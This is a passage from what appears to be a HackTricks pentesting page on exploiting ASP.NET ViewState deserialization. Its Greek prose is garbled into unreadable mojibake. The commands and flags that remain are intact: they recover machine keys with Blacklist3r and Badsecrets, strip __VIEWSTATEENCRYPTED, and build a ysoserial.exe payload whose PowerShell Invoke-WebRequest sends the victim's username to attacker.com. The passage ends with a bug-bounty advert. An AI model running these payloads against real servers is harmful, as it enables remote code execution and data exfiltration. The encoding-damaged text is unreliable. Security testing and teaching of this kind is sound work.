Î£Îµ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ ÏŒÏ€Î¿Ï… Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ `_VIEWSTATEGENERATOR` **Î´ÎµÎ½ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»ÎµÏ„Î±Î¹** Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®, **Î´ÎµÎ½** Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± **Ï€Î±ÏÎ­Ï‡ÎµÏ„Îµ** Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `--generator` **Î±Î»Î»Î¬ Î±Ï…Ï„Î­Ï‚**:
```bash
--apppath="/" --path="/hello.aspx"
```
### Test Case: 3 â€“ .Net < 4.5 ÎºÎ±Î¹ EnableViewStateMac=true/false ÎºÎ±Î¹ ViewStateEncryptionMode=true

Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î³Î½Ï‰ÏƒÏ„ÏŒ Î±Î½ Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Ï‚ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏ…Î¼Î­Î½Î· Î¼Îµ MAC. Î¤ÏŒÏ„Îµ, Î· Ï„Î¹Î¼Î® ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¸Î±Î½ÏŒ Î½Î± ÎµÎ¯Î½Î±Î¹ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î· ÎºÎ±Î¹ Î¸Î± **Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î¿ Machine Key Î³Î¹Î± Î½Î± ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÏ„Îµ Ï„Î¿ payload ÏƒÎ±Ï‚** Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±.

**Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· Ï„Î¿** [**Blacklist3r**](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) **module ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÏŒ Î±Î½Î¬Ï€Ï„Ï…Î¾Î·...**

**Î ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î¿ .NET 4.5**, Ï„Î¿ ASP.NET Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î´Î­Ï‡ÎµÏ„Î±Î¹** Î¼Î¹Î± **Î¼Î· ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î·** \_`__VIEWSTATE`\_Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Î±Ï€ÏŒ Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ **Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½** **`ViewStateEncryptionMode`** Î­Ï‡ÎµÎ¹ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ ÏƒÎµ _**Always**_. Î¤Î¿ ASP.NET **ÎµÎ»Î­Î³Ï‡ÎµÎ¹ Î¼ÏŒÎ½Î¿** Ï„Î·Î½ **Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î±** Ï„Î·Ï‚ **`__VIEWSTATEENCRYPTED`** Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï… ÏƒÏ„Î¿ Î±Î¯Ï„Î·Î¼Î±. **Î‘Î½ ÎºÎ¬Ï€Î¿Î¹Î¿Ï‚ Î±Ï†Î±Î¹ÏÎ­ÏƒÎµÎ¹ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Ï„Î¿ Î¼Î· ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿ payload, Î¸Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯ ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¬.**

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, Î±Î½ Î¿Î¹ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹ Î²ÏÎ¿Ï…Î½ Î­Î½Î±Î½ Ï„ÏÏŒÏ€Î¿ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ Ï„Î¿ Machinekey Î¼Î­ÏƒÏ‰ Î¬Î»Î»Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ ÏŒÏ€Ï‰Ï‚ Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® Î±ÏÏ‡ÎµÎ¯Ï‰Î½, Î· ÎµÎ½Ï„Î¿Î»Î® [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net) Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®Î¸Î·ÎºÎµ ÏƒÏ„Î·Î½ **Î ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· 2**, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ RCE Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚ ViewState.

* Î‘Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `__VIEWSTATEENCRYPTED` Î±Ï€ÏŒ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚ ViewState, Î±Î»Î»Î¹ÏÏ‚ Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Î­Î½Î± ÏƒÏ†Î¬Î»Î¼Î± ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ MAC Viewstate ÎºÎ±Î¹ Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î¸Î± Î±Ï€Î¿Ï„ÏÏ‡ÎµÎ¹.

### Test Case: 4 â€“ .Net >= 4.5 ÎºÎ±Î¹ EnableViewStateMac=true/false ÎºÎ±Î¹ ViewStateEncryptionMode=true/false ÎµÎºÏ„ÏŒÏ‚ Î±Î½ ÎºÎ±Î¹ Î¿Î¹ Î´ÏÎ¿ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿Î¹ ÎµÎ¯Î½Î±Î¹ false

ÎœÏ€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î±Î½Î±Î³ÎºÎ¬ÏƒÎ¿Ï…Î¼Îµ Ï„Î· Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… Ï€Î»Î±Î¹ÏƒÎ¯Î¿Ï… ASP.NET ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ web.config ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰.
```xml
<httpRuntime targetFramework="4.5" />
```
Î•Î½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ¬, Î±Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î³Î¯Î½ÎµÎ¹ ÎºÎ±Î¸Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÏ€Î¹Î»Î¿Î³Î® Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `machineKey` Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿Ï… web.config.
```bash
compatibilityMode="Framework45"
```
ÎŒÏ€Ï‰Ï‚ ÎºÎ±Î¹ ÏƒÏ„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Ï„Î¿ **value ÎµÎ¯Î½Î±Î¹ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿.** Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î³Î¹Î± Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î¼Î¹Î± **Î­Î³ÎºÏ…ÏÎ· payload, Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯**.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î¿ [**Blacklist3r(AspDotNetWrapper.exe)** ](https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper) Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹:
```
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata bcZW2sn9CbYxU47LwhBs1fyLvTQu6BktfcwTicOfagaKXho90yGLlA0HrdGOH6x/SUsjRGY0CCpvgM2uR3ba1s6humGhHFyr/gz+EP0fbrlBEAFOrq5S8vMknE/ZQ/8NNyWLwg== --decrypt --purpose=viewstate  --valalgo=sha1 --decalgo=aes --IISDirPath "/" --TargetPagePath "/Content/default.aspx"

--encrypteddata = {__VIEWSTATE parameter value}
--IISDirPath = {Directory path of website in IIS}
--TargetPagePath = {Target page path in application}
```
Î“Î¹Î± Î¼Î¹Î± Ï€Î¹Î¿ Î»ÎµÏ€Ï„Î¿Î¼ÎµÏÎ® Ï€ÎµÏÎ¹Î³ÏÎ±Ï†Î® Î³Î¹Î± Ï„Î¿ IISDirPath ÎºÎ±Î¹ Ï„Î¿ TargetPagePath [Î±Î½Î±Ï„ÏÎ­Î¾Ï„Îµ ÎµÎ´Ï](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)

Î‰, Î¼Îµ Ï„Î¿ [**Badsecrets**](https://github.com/blacklanternsecurity/badsecrets) (Î¼Îµ Î¼Î¹Î± Ï„Î¹Î¼Î® Î³ÎµÎ½Î½Î®Ï„ÏÎ¹Î±Ï‚):
```bash
cd badsecrets
python examples/blacklist3r.py --viewstate JLFYOOegbdXmPjQou22oT2IxUwCAzSA9EAxD6+305e/4MQG7G1v5GI3wL7D94W2OGpVGrI2LCqEwDoS/8JkE0rR4ak0= --generator B2774415
```
![https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png](https://user-images.githubusercontent.com/24899338/227043316-13f0488f-5326-46cc-9604-404b908ebd7b.png)

ÎœÏŒÎ»Î¹Ï‚ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÏ„ÎµÎ¯ Î­Î½Î± Î­Î³ÎºÏ…ÏÎ¿ Machine key, **Ï„Î¿ ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ Î²Î®Î¼Î± ÎµÎ¯Î½Î±Î¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î­Î½Î± ÏƒÎµÎ¹ÏÎ¹Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ payload Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚** [**YSoSerial.Net**](https://github.com/pwntester/ysoserial.net)
```
ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
```
Î‘Î½ Î­Ï‡ÎµÏ„Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï… `__VIEWSTATEGENERATOR`, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ** Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ `--generator` Î¼Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï„Î¹Î¼Î® ÎºÎ±Î¹ Î½Î± **Ï€Î±ÏÎ±Î»ÎµÎ¯ÏˆÎµÏ„Îµ** Ï„Î¹Ï‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚ `--path` ÎºÎ±Î¹ `--apppath`.

![](https://notsosecure.com/sites/all/assets/group/nss\_uploads/2019/06/4.2.png)

ÎœÎ¹Î± ÎµÏ€Î¹Ï„Ï…Ï‡Î®Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ Î±Ï€Î¿ÏƒÏ…Î¼Ï€Î¯ÎµÏƒÎ·Ï‚ ViewState Î¸Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ Î­Î½Î± out-of-band Î±Î¯Ï„Î·Î¼Î± ÏƒÎµ Î­Î½Î±Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·. Î‘Ï…Ï„ÏŒÏ‚ Î¿ Ï„ÏÏ€Î¿Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Î±Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ ÏƒÎµ Î¼Î¹Î± Î±Ï€ÏŒÎ´ÎµÎ¹Î¾Î· Î­Î½Î½Î¿Î¹Î±Ï‚ (PoC) Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²ÏÎµÎ¸ÎµÎ¯ Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ Ï€ÏŒÏÎ¿Ï… Î¼Îµ Ï„Î¯Ï„Î»Î¿ "Exploiting ViewState Deserialization using Blacklist3r and YsoSerial.NET". Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ ÎºÎ±Î¹ Ï€ÏÏ‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ ÎµÏÎ³Î±Î»ÎµÎ¯Î± ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Blacklist3r Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ´Î¹Î¿ÏÎ¯ÏƒÎµÏ„Îµ Ï„Î¿ MachineKey, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½Î±Î¸ÎµÏ‰ÏÎ®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎµÏ‡ÏŒÎ¼ÎµÎ½Î· [PoC Ï„Î·Ï‚ Î•Ï€Î¹Ï„Ï…Ï‡Î¿ÏÏ‚ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/#PoC).

### Test Case 6 â€“ Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ ViewStateUserKeys

Î— Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± **ViewStateUserKey** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± **Î±Î¼Ï…Î½Î¸ÎµÎ¯** ÎºÎ±Ï„Î¬ ÎµÎ½ÏŒÏ‚ **CSRF attack**. Î‘Î½ Î­Ï‡ÎµÎ¹ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ Î­Î½Î± Ï„Î­Ï„Î¿Î¹Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎºÎ±Î¹ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎ¿Ï…Î¼Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ **ViewState** payload Î¼Îµ Ï„Î¹Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ Ï€Î¿Ï… ÏƒÏ…Î¶Î·Ï„Î®Î¸Î·ÎºÎ±Î½ Î¼Î­Ï‡ÏÎ¹ Ï„ÏÏÎ±, Ï„Î¿ **payload Î´ÎµÎ½ Î¸Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„ÎµÎ¯ Î±Ï€ÏŒ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®**.\
Î ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î¯Î± Î±ÎºÏŒÎ¼Î· Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ ÏƒÏ‰ÏƒÏ„Î¬ Ï„Î¿ payload:
```bash
--viewstateuserkey="randomstringdefinedintheserver"
```
### Result of a Successful Exploitation <a href="#poc" id="poc"></a>

Î“Î¹Î± ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Î´Î¿ÎºÎ¹Î¼ÏÎ½, Î±Î½ Ï„Î¿ payload ViewState YSoSerial.Net Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ **ÎµÏ€Î¹Ï„Ï…Ï‡ÏÏ‚**, Ï„ÏŒÏ„Îµ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î±Ï€Î±Î½Ï„Î¬ Î¼Îµ â€œ**500 Internal server error**â€ Î­Ï‡Î¿Î½Ï„Î±Ï‚ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ â€œ**Î— Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯Î± ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Î¼Î· Î­Î³ÎºÏ…ÏÎ· Î³Î¹Î± Î±Ï…Ï„Î® Ï„Î· ÏƒÎµÎ»Î¯Î´Î± ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Î´Î¹Î±Ï†Î¸Î±ÏÎµÎ¯**â€ ÎºÎ±Î¹ Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î¼Îµ Ï„Î¿ OOB request.

Check for [further information here](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/\[\*\*https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\*\*]\(https:/www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/\)/README.md)

## References

* [**https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/**](https://www.notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/)
* [**https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817**](https://medium.com/@swapneildash/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)\\
* [**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/)
* [**https://blog.blacklanternsecurity.com/p/introducing-badsecrets**](https://blog.blacklanternsecurity.com/p/introducing-badsecrets)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
